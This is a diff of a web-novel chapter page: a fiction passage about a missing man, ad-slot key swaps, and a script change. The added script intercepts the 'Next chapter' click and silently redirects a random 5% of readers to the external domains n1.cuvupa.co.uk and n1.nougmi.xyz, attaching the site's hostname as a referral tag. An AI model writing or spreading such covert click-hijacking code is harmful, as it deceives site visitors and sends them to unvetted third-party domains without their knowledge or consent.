@@ -2391,19 +2391,19 @@
                 <p>Julian turned to see his younger sister standing at the stairway, her disheveled hair framing her face, her ankles pale under the light.</p>
                 <p>&#34;Where&#39;s Ethan Sullivan?&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>Julian swallowed hard. &#34;Probably at home...&#34;</p>
                 <p>&#34;His phone is off.&#34; Evelyn held up her device, the call log burning her eyes. &#34;What&#39;s really going on?&#34;</p>
                 <p>The air grew heavy with silence.</p>
                 <p>&#34;Harrison said...&#34; Julian spoke with difficulty, &#34;Ethan went missing after leaving the office this afternoon.&#34;</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>Evelyn&#39;s pupils contracted sharply.</p>
                 <p>&#34;His phone was found in the east suburbs.&#34; Julian&#39;s voice dropped lower. &#34;But he...&#34;</p>
                 <p>Her nails dug deep into her palms.</p>
                 <p>&#34;When did this happen?&#34;</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>&#34;Three this afternoon...&#34;</p>
                 <p>A sudden realization flashed in her sharp gaze. &#34;You were at Symphony Heights?&#34;</p>
                 <p>Julian&#39;s expression changed.</p>
@@ -2415,7 +2415,7 @@
                 <p>That&#39;s why everyone kept it from her.</p>
                 <p>Evelyn&#39;s chest heaved violently as she spun around and dashed upstairs.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>&#34;Evelyn!&#34; Julian called after her. &#34;We&#39;ve already sent people to search!&#34;</p>
                 <p>His only answer was the deafening slam of a door.</p>
                 <p>In her bedroom, Evelyn grabbed a jacket and pulled it on.</p>
@@ -2424,7 +2424,7 @@
                 <p>She wiped her eyes fiercely and retrieved a car key from the depths of a drawer.</p>
                 <p>Outside, the night stretched like spilled ink.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
             </div>
             
             <div class="font-controls">
@@ -2546,7 +2546,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2562,8 +2562,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
